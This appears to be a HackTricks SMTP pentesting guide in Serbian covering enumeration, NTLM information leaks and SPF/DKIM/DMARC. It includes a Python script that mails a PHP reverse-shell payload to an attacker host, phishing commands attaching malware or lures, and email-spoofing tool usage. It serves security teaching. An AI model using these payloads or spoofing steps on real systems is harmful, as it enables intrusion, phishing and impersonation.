# 25,465,587 - Pentestiranje SMTP-a

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Trenutno dostupna postavka za procenu ranjivosti i testiranje penetracije**. Pokrenite pun pentest sa bilo kog mesta sa preko 20 alata i funkcija koje idu od prikupljanja informacija do izveštavanja. Mi ne zamenjujemo pentestere - mi razvijamo prilagođene alate, module za otkrivanje i eksploataciju kako bismo im vratili neko vreme da dublje istraže, probiju ljuske i zabave se.

{% embed url="https://pentest-tools.com/" %}

## **Osnovne informacije**

**Simple Mail Transfer Protocol (SMTP)** je protokol koji se koristi u TCP/IP paketu za **slanje i primanje e-pošte**. Zbog svojih ograničenja u čekanju poruka na strani primaoca, SMTP se često koristi zajedno sa **POP3 ili IMAP**. Ovi dodatni protokoli omogućavaju korisnicima da skladište poruke na serveru i periodično ih preuzimaju.

U praksi, uobičajeno je da **programi za e-poštu** koriste **SMTP za slanje e-pošte**, dok koriste **POP3 ili IMAP za prijem**. Na sistemima zasnovanim na Unix-u, **sendmail** se ističe kao SMTP server koji se najčešće koristi u svrhu slanja e-pošte. Komercijalni paket poznat kao Sendmail obuhvata POP3 server. Osim toga, **Microsoft Exchange** pruža SMTP server i nudi mogućnost uključivanja podrške za POP3.

**Podrazumevani port:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### EMAIL zaglavlja

Ako imate priliku da **natjerate žrtvu da vam pošalje e-poštu** (putem kontakt forme na web stranici, na primjer), iskoristite je jer **možete saznati o unutarnjoj topologiji** žrtve pregledanjem zaglavlja e-pošte.

Također možete dobiti e-poštu sa SMTP servera pokušavajući **poslati tom serveru e-poštu na nepostojeću adresu** (jer će server poslati napadaču NDN e-poštu). Ali, pobrinite se da pošaljete e-poštu sa dozvoljene adrese (provjerite SPF politiku) i da možete primati NDN poruke.

Trebali biste također pokušati **poslati različite sadržaje jer možete pronaći zanimljivije informacije** u zaglavljima kao što su: `X-Virus-Scanned: by av.domain.com`\
Trebali biste poslati EICAR testnu datoteku.\
Otkrivanje **AV-a** može vam omogućiti iskorištavanje **poznatih ranjivosti.**

## Osnovne radnje

### **Banner Grabbing/Osnovna veza**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:

SMTPS (Secure SMTP) je sigurna verzija protokola Simple Mail Transfer Protocol (SMTP) koja koristi SSL/TLS enkripciju za zaštitu komunikacije između poštanskog klijenta i poštanskog servera. Ova enkripcija obezbeđuje sigurnu razmenu elektronske pošte tako što štiti od neovlašćenog pristupa ili presretanja podataka.

Da biste izvršili pentestiranje SMTPS-a, možete koristiti različite tehnike kao što su:

- **Sniffing**: Ova tehnika se koristi za presretanje i analizu mrežnog saobraćaja između poštanskog klijenta i servera kako bi se otkrile osetljive informacije poput korisničkih imena i lozinki.

- **Brute forcing**: Ova tehnika uključuje pokušaj pronalaženja ispravnih korisničkih imena i lozinki metodom pokušaja i greške.

- **Spoofing**: Ova tehnika se koristi za lažno predstavljanje kao drugi poštanski server kako bi se izvršili napadi poput phishinga ili distribucije zlonamernih fajlova.

- **Command Injection**: Ova tehnika uključuje ubacivanje zlonamernih komandi u SMTP zahtev kako bi se izvršili napadi poput izvršavanja udaljenog koda.

Pentestiranje SMTPS-a može otkriti ranjivosti u konfiguraciji servera, slabim lozinkama ili neispravnoj implementaciji SSL/TLS enkripcije. Ove ranjivosti mogu biti iskorišćene za neovlašćeni pristup poštanskom serveru ili krađu osetljivih informacija.
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### Pronalaženje MX servera organizacije

Da biste pronašli MX servere organizacije, možete koristiti nekoliko metoda:

1. **DNS upiti**: Izvršite DNS upit za zonu domena organizacije kako biste dobili informacije o MX zapisima. Možete koristiti alate poput `nslookup` ili `dig` za izvršavanje ovih upita.

   Primer upita za `nslookup`:
   ```
   nslookup -type=MX <domen>
   ```

   Primer upita za `dig`:
   ```
   dig MX <domen>
   ```

2. **Online alati**: Postoje online alati koji vam omogućavaju da pronađete MX servere organizacije. Jedan od takvih alata je `MX Toolbox` (https://mxtoolbox.com/MXLookup.aspx). Jednostavno unesite domen organizacije i alat će vam prikazati MX zapise.

3. **Reverzno inženjerstvo**: Ponekad možete pronaći informacije o MX serverima organizacije analizirajući javno dostupne informacije, kao što su javni DNS zapisi, veb stranice ili društveni mediji. Ove informacije mogu vam pomoći da identifikujete MX servere.

Važno je napomenuti da je pronalaženje MX servera samo početak procesa pentestiranja SMTP servisa organizacije. Nakon što identifikujete MX servere, možete nastaviti sa analizom ranjivosti i izvršavanjem odgovarajućih testova.
```bash
dig +short mx google.com
```
### Enumeracija

SMTP server može biti jedan od ključnih ciljeva za napadače prilikom testiranja penetracije. Enumeracija je proces prikupljanja informacija o SMTP serveru kako bi se identifikovali validni korisnički nalozi, proverila dostupnost servisa i otkrili potencijalne ranjivosti.

#### Identifikacija SMTP servera

Prvi korak u procesu enumeracije je identifikacija SMTP servera. To se može postići skeniranjem mreže ili DNS upitom. Takođe, možete proveriti otvorene portove na ciljnom sistemu kako biste pronašli SMTP port (obično port 25).

#### Provera dostupnosti servisa

Nakon identifikacije SMTP servera, sledeći korak je provera dostupnosti servisa. To se može uraditi pokušajem uspostavljanja konekcije sa SMTP serverom. Ako je konekcija uspešna, to znači da je servis dostupan.

#### Enumeracija korisničkih naloga

Kada je servis dostupan, možete započeti proces enumeracije korisničkih naloga. Postoji nekoliko tehnika koje se mogu koristiti za ovo:

- **VRFY komanda**: Ova komanda se koristi za proveru validnosti korisničkog naloga. Možete je koristiti za proveru da li određeni korisnički nalog postoji na SMTP serveru.

- **RCPT TO komanda**: Ova komanda se koristi za proveru da li je određeni korisnički nalog validan za slanje poruka. Možete je koristiti za proveru da li je određeni korisnički nalog aktivan i može primati poruke.

- **Brute force napadi**: Možete koristiti brute force napade kako biste pokušali da pogodite korisničke naloge na SMTP serveru. Ovo uključuje pokušaj kombinacija korisničkih imena i lozinki kako biste pronašli validne naloge.

#### Otkrivanje potencijalnih ranjivosti

Tokom procesa enumeracije, možete otkriti potencijalne ranjivosti SMTP servera. Na primer, možete proveriti da li server podržava nebezbedne autentifikacione metode ili da li je podložan određenim vrstama napada kao što su relaying napadi.

#### Zaključak

Enumeracija SMTP servera je važan korak u procesu testiranja penetracije. Prikupljanje informacija o serveru, provera dostupnosti servisa, enumeracija korisničkih naloga i otkrivanje potencijalnih ranjivosti omogućava napadačima da identifikuju slabosti i izvrše uspešne napade na SMTP server.
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Autentifikacija - Otkrivanje informacija

Ako server podržava NTLM autentifikaciju (Windows), možete dobiti osetljive informacije (verzije). Više informacija [**ovde**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
Ili **automatizujte** ovo pomoću **nmap** dodatka `smtp-ntlm-info.nse`

### Otkrivanje informacija - Interno ime servera

Neke SMTP servere automatski popunjavaju adresu pošiljaoca kada se izda komanda "MAIL FROM" bez potpune adrese, otkrivajući njegovo interno ime:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Snifovanje

Proverite da li možete da snifujete neku lozinku iz paketa koji se šalju na port 25.

### [Bruteforce autentifikacije](../../generic-methodologies-and-resources/brute-force.md#smtp)

## Enumeracija korisničkih imena putem Bruteforce metode

**Autentifikacija nije uvek potrebna**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY

VRFY (VeriFy) je SMTP komanda koja se koristi za proveru validnosti email adrese. Kada se koristi VRFY komanda, SMTP server će proveriti da li je adresa validna i odgovoriti sa informacijom o postojanju ili nepostojanju adrese. Ova komanda se često koristi u fazi prikupljanja informacija tokom testiranja penetracije SMTP servera.

Da biste koristili VRFY komandu, možete je poslati preko telnet konekcije na SMTP server. Na primer:

```
telnet mail.example.com 25
VRFY email@example.com
```

Ako je adresa validna, server će odgovoriti sa porukom "250 OK". U suprotnom, server će odgovoriti sa porukom "550 No such user".

Važno je napomenuti da neki SMTP serveri mogu biti konfigurisani da ne podržavaju VRFY komandu ili da je ograniče kako bi sprečili napade na privatnost.
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN

EXPAND je SMTP komanda koja se koristi za proširivanje (expandovanje) distribucijske liste na SMTP serveru. Ova komanda se koristi za dobijanje spiska svih članova distribucijske liste. Međutim, ova komanda može biti iskorišćena za prikupljanje informacija o korisnicima na ciljnom serveru.

Napadač može koristiti EXPN komandu kako bi otkrio validne email adrese na ciljnom serveru. Ovo može biti korisno za dalje napade kao što su phishing ili brute force napadi na email naloge.

Da bi se izvršio napad korišćenjem EXPN komande, napadač može koristiti SMTP klijent alat kao što je Telnet ili specijalizovani alati za testiranje penetracije. Evo primera kako se koristi EXPN komanda koristeći Telnet:

```
telnet <SMTP_server> 25
EXPAND <distribution_list>
```

Gde `<SMTP_server>` predstavlja IP adresu ili ime ciljnog SMTP servera, a `<distribution_list>` predstavlja ime distribucijske liste koju želite da proširite.

Napadač može koristiti rezultate EXPN komande za dalje istraživanje i napade na ciljnom serveru. Važno je napomenuti da neki SMTP serveri mogu biti konfigurisani da ne odgovaraju na EXPN komandu ili da je ograniče samo na određene korisnike.
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### Automatski alati

There are several automated tools available for SMTP pentesting that can help in identifying vulnerabilities and weaknesses in the SMTP service. These tools can be used to perform various tasks such as enumeration, brute-forcing, and vulnerability scanning. Some popular automated tools for SMTP pentesting are:

- **Nmap**: Nmap is a powerful network scanning tool that can be used to scan for open SMTP ports and identify potential vulnerabilities.
- **Metasploit**: Metasploit is a widely used penetration testing framework that includes modules for SMTP enumeration and exploitation.
- **SMTP User Enum**: SMTP User Enum is a tool specifically designed for enumerating valid users on an SMTP server.
- **SMTPTester**: SMTPTester is a Python-based tool that can be used to test the security of an SMTP server by performing various tests such as user enumeration, password guessing, and open relay testing.
- **OpenVAS**: OpenVAS is an open-source vulnerability scanning tool that can be used to scan for vulnerabilities in SMTP servers.

These tools can save time and effort by automating the process of identifying vulnerabilities in SMTP services. However, it is important to note that automated tools should be used responsibly and with proper authorization.
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Trenutno dostupna postavka za procenu ranjivosti i testiranje prodiranja**. Pokrenite potpuni test prodiranja sa više od 20 alata i funkcija koje idu od istraživanja do izveštavanja. Mi ne zamenjujemo testere prodiranja - mi razvijamo prilagođene alate, module za otkrivanje i eksploataciju kako bismo im vratili neko vreme da dublje kopaju, otvaraju ljuske i zabavljaju se.

{% embed url="https://pentest-tools.com/" %}

## Izveštaji o DSN-u

**Izveštaji o obaveštenju o statusu isporuke**: Ako pošaljete **email** organizaciji na **nevažeću adresu**, organizacija će vas obavestiti da je adresa nevažeća slanjem **povratnog mejla**. **Zaglavlja** vraćenog mejla će **sadržati** moguće **osetljive informacije** (kao što su IP adresa mejl servisa koji su interaktovali sa izveštajima ili informacije o antivirusnom softveru).

## [Komande](smtp-commands.md)

### Slanje mejla sa linux konzole
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Slanje emaila pomoću Pythona

Da biste poslali email pomoću Pythona, možete koristiti `smtplib` biblioteku koja je ugrađena u Python standardnu biblioteku. Evo osnovnog koda koji demonstrira kako poslati email:

```python
import smtplib
from email.mime.text import MIMEText

def send_email(sender, receiver, subject, message):
    msg = MIMEText(message)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = receiver

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender, 'your_password')
        server.sendmail(sender, receiver, msg.as_string())
        server.quit()
        print("Email successfully sent!")
    except Exception as e:
        print("Error sending email:", str(e))

# Example usage
sender = 'your_email@gmail.com'
receiver = 'recipient_email@gmail.com'
subject = 'Hello from Python!'
message = 'This is a test email sent using Python.'

send_email(sender, receiver, subject, message)
```

U ovom primeru, koristimo Gmail SMTP server za slanje emaila. Morate uneti svoju Gmail adresu kao `sender` i lozinku kao `'your_password'`. Takođe, unesite adresu primaoca u `receiver`, subjekat emaila u `subject` i poruku u `message`.

Nakon pokretanja ovog koda, Python će pokušati da se poveže sa Gmail SMTP serverom, prijavi se koristeći vašu adresu i lozinku, i pošalje email sa unetim podacima. Ako je sve uspešno, dobićete poruku "Email successfully sent!" u konzoli.

Napomena: Pre nego što koristite ovaj kod, uverite se da je omogućeno "Manje sigurne aplikacije" u postavkama vašeg Gmail naloga.
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
## Mere protiv krađe pošte

Organizacije sprečavaju neovlašćeno slanje e-pošte u njihovo ime primenom **SPF**, **DKIM** i **DMARC** zbog jednostavnosti falsifikovanja SMTP poruka.

**Potpuni vodič o ovim merama** dostupan je na [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/).

### SPF

{% hint style="danger" %}
SPF [je "zastareo" 2014. godine](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). To znači da umesto kreiranja **TXT zapisa** u `_spf.domen.com`, kreirate ga u `domen.com` koristeći **isti sintaksu**.\
Osim toga, da biste ponovo koristili prethodne SPF zapise, često je uobičajeno pronaći nešto poput `"v=spf1 include:_spf.google.com ~all"`.
{% endhint %}

**Sender Policy Framework** (SPF) je mehanizam koji omogućava Mail Transfer Agentima (MTA) da provere da li je host koji šalje e-poštu ovlašćen tako što upituje listu ovlašćenih poštanskih servera definisanih od strane organizacija. Ova lista, koja specificira IP adrese/opsege, domene i druge entitete **ovlašćene za slanje e-pošte u ime domena**, uključuje različite "**Mehanizme**" u SPF zapisu.

#### Mehanizmi

Prema [Vikipediji](https://en.wikipedia.org/wiki/Sender_Policy_Framework):

| Mehanizam | Opis                                                                                                                                                                                                                                                                                                                               |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | Uvek se poklapa; koristi se za podrazumevani rezultat poput `-all` za sve IP adrese koje se ne poklapaju sa prethodnim mehanizmima.                                                                                                                                                                                                 |
| A         | Ako ime domena ima zapis adrese (A ili AAAA) koji se može rešiti na adresu pošiljaoca, poklapaće se.                                                                                                                                                                                                                              |
| IP4       | Ako je pošiljalac u datom IPv4 opsegu adresa, poklapaće se.                                                                                                                                                                                                                                                                         |
| IP6       | Ako je pošiljalac u datom IPv6 opsegu adresa, poklapaće se.                                                                                                                                                                                                                                                                         |
| MX        | Ako ime domena ima MX zapis koji se rešava na adresu pošiljaoca, poklapaće se (tj. pošta dolazi sa jednog od dolaznih poštanskih servera domena).                                                                                                                                                                                      |
| PTR       | Ako je ime domena (PTR zapis) za adresu klijenta u datoj domeni i to ime domena se rešava na adresu klijenta (provera obrnutog DNS-a), poklapaće se. Ovaj mehanizam se ne preporučuje i treba ga izbegavati, ako je moguće.                                                                                                        |
| EXISTS    | Ako dato ime domena se rešava na bilo koju adresu, poklapaće se (bez obzira na adresu na koju se rešava). Ovo se retko koristi. Uz pomoć SPF makro jezika, nudi složenije poklapanje poput DNSBL upita.                                                                                                                             |
| INCLUDE   | Referiše na politiku druge domene. Ako politika te domene prođe, ovaj mehanizam prolazi. Međutim, ako politika koja je uključena ne uspe, obrada se nastavlja. Da biste u potpunosti delegirali politiku druge domene, mora se koristiti proširenje za preusmeravanje.                                                                  |
| REDIRECT  | <p>Preusmeravanje je pokazivač na drugo ime domena koje hostuje SPF politiku, omogućava više domena da dele istu SPF politiku. Korisno je kada radite sa velikim brojem domena koje dele istu infrastrukturu e-pošte.</p><p>SPF politika domena naznačena u mehanizmu za preusmeravanje će se koristiti.</p> |

Takođe je moguće identifikovati **Kvalifikatore** koji ukazuju **šta treba uraditi ako se mehanizam poklopi**. Podrazumevano se koristi **kvalifikator "+"** (tako da ako se poklopi bilo koji mehanizam, to znači da je dozvoljeno).\
Obično ćete primetiti **na kraju svake SPF politike** nešto poput: **\~all** ili **-all**. To se koristi da bi se naznačilo da **ako pošiljalac ne odgovara nijednoj SPF politici, treba označiti e-poštu kao nepouzdanu (\~) ili odbiti (-) e-poštu.**

#### Kvalifikatori

Svaki mehanizam unutar politike može biti prefiksan jednim od četiri kvalifikatora kako bi se definisao željeni rezultat:

* **`+`**: Odgovara rezultatu PROLAZ. Podrazumevano, mehanizmi pretpostavljaju ovaj kvalifikator, što znači da je `+mx` ekvivalentno `mx`.
* **`?`**: Predstavlja rezultat NEUTRALNO, tretiran slično kao NEMA (bez posebne politike).
* **`~`**: Označava SOFTFAIL, služeći kao srednje rešenje između NEUTRALNO i NEUSPEH. E-pošta koja zadovoljava ovaj rezultat obično se prihvata, ali se označava prema tome.
* **`-`**: Označava NEUSPEH, sugerišući da e-pošta treba biti odbijena.

U sledećem primeru je prikazana **SPF politika za google.com**. Obratite pažnju na uključivanje SPF politika iz različitih domena unutar prve SPF politike:
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
Tradicionalno je bilo moguće lažirati bilo koji domen koji nije imao ispravan/nikakav SPF zapis. **Danas**, ako **email** dolazi sa **domena bez validnog SPF zapisa**, verovatno će biti **automatski odbijen/označen kao nepouzdan**.

Da biste proverili SPF domena, možete koristiti online alate kao što je: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIM se koristi za potpisivanje odlaznih emailova, omogućavajući njihovu validaciju od strane eksternih Mail Transfer Agenta (MTA) putem dobijanja javnog ključa domena iz DNS-a. Javni ključ se nalazi u TXT zapisu domena. Da biste pristupili ovom ključu, morate znati i selektor i ime domena.

Na primer, zahtev za ključem zahteva ime domena i selektor. Ove informacije se mogu pronaći u zaglavlju emaila `DKIM-Signature`, na primer, `d=gmail.com;s=20120113`.

Komanda za dobijanje ovih informacija može izgledati ovako:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (Domain-based Message Authentication, Reporting & Conformance)

DMARC poboljšava sigurnost e-pošte nadograđujući SPF i DKIM protokole. On definiše politike koje usmeravaju poštanske servere u postupanju sa e-poštom sa određene domene, uključujući kako postupati sa neuspelim autentifikacijama i gde slati izveštaje o akcijama obrade e-pošte.

**Da biste dobili DMARC zapis, morate upitati poddomen \_dmarc**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC oznake

| Ime oznake | Svrha                                         | Primer                          |
| ---------- | --------------------------------------------- | ------------------------------- |
| v          | Verzija protokola                             | v=DMARC1                        |
| pct        | Procenat poruka podvrgnutih filtriranju        | pct=20                          |
| ruf        | URI za izveštaje o forenzičkim analizama       | ruf=mailto:authfail@example.com |
| rua        | URI za izveštaje o agregiranim analizama        | rua=mailto:aggrep@example.com   |
| p          | Politika za organizacionu domenu               | p=quarantine                    |
| sp         | Politika za poddomene OD                       | sp=reject                       |
| adkim      | Režim poravnanja za DKIM                       | adkim=s                         |
| aspf       | Režim poravnanja za SPF                        | aspf=r                          |

### **Šta je sa poddomenima?**

**Odavde** [**ovde**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
Morate imati posebne SPF zapise za svaku poddomenu sa koje želite slati poštu.\
Sledeći tekst je originalno objavljen na openspf.org, koji je nekada bio odličan izvor za ovakve stvari.

> Demon pitanje: Šta je sa poddomenima?
>
> Ako dobijem poštu sa pielovers.demon.co.uk, i nema SPF podataka za pielovers, da li treba da se vratim jedan nivo unazad i testiram SPF za demon.co.uk? Ne. Svaka poddomena na Demonu je drugi korisnik, i svaki korisnik može imati svoju politiku. Ne bi imalo smisla da se politika Demona automatski primenjuje na sve svoje korisnike; ako Demon to želi, može postaviti SPF zapise za svaku poddomenu.
>
> Dakle, savet izdavačima SPF-a je sledeći: trebali biste dodati SPF zapis za svaku poddomenu ili ime hosta koje ima A ili MX zapis.
>
> Sajtovi sa wildcard A ili MX zapisima takođe trebaju imati wildcard SPF zapis, u obliku: \* IN TXT "v=spf1 -all"

Ovo ima smisla - poddomena može biti smeštena na drugoj geografskoj lokaciji i imati vrlo različitu definiciju SPF-a.

### **Otvoreni relej**

Prilikom slanja e-pošte, važno je osigurati da ne bude označena kao spam. To se često postiže korišćenjem **relejnog servera koji je pouzdan za primaoca**. Međutim, čest izazov je da administratori možda nisu potpuno svesni kojim **IP opsegom je bezbedno dozvoliti**. Nedostatak razumevanja može dovesti do grešaka pri konfigurisanju SMTP servera, što je često identifikovano kao rizik u bezbednosnim procenama.

Rešenje koje neki administratori koriste kako bi izbegli probleme sa isporukom e-pošte, posebno u vezi sa komunikacijom sa potencijalnim ili postojećim klijentima, je da **dozvole konekcije sa bilo koje IP adrese**. To se postiže konfigurisanjem parametra `mynetworks` SMTP servera da prihvata sve IP adrese, kao što je prikazano u primeru ispod:
```bash
mynetworks = 0.0.0.0/0
```
Za proveru da li je poštanski server otvoreni relej (što znači da može prosleđivati e-poštu sa bilo kog spoljnog izvora), često se koristi alatka `nmap`. Ona uključuje poseban skript dizajniran za testiranje ove funkcionalnosti. Komanda za sprovođenje detaljnog skeniranja servera (na primer, sa IP adresom 10.10.10.10) na portu 25 koristeći `nmap` je:
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **Alati**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **Proverite konfiguracije SPF i DMARC**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **Automatski dobijte SPF i DMARC konfiguracije**

### Slanje lažnih emailova

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)

**Ili možete koristiti alat:**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
{% hint style="warning" %}
Ako dobijete bilo kakvu grešku prilikom korišćenja dkim python biblioteke za parsiranje ključa, slobodno koristite sledeći ključ.\
**NAPOMENA**: Ovo je samo brzo rešenje za brze provere u slučajevima kada iz nekog razloga openssl privatni ključ **ne može biti parsiran od strane dkim**.
```
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
